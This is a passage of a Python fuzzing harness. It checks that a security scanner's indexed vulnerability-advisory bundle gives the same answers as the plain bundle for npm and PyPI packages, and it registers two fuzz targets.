                  f"{len(indexed.advisories)} against {len(plain.advisories)}")
            check(indexed.verify()["advisories"] == len(plain.advisories), "bundle-doc-verify")
            for name in names_in(plain.advisories):
                for eco in (None, "npm", "pypi"):
                    check(indexed.advisories_for(name, eco) == plain.advisories_for(name, eco), "bundle-doc-answers",
                          repr((name, eco)))

    folder = tempfile.mkdtemp(prefix="lazaret-fuzz-")

    def close():
        shutil.rmtree(folder, ignore_errors=True)
    return run, close


register("sca-bundle-index", "scanner.sca_index.IndexedBundle on a file as given and with its checksums made right",
         index_seeds, index_start, INDEX_WORDS, max_len=16384)
register("sca-bundle-doc", "a bundle document read as CveBundle and through the indexed file: the same answers",
         lambda: list(BUNDLE_DOCS), doc_start, BUNDLE_WORDS, max_len=16384)
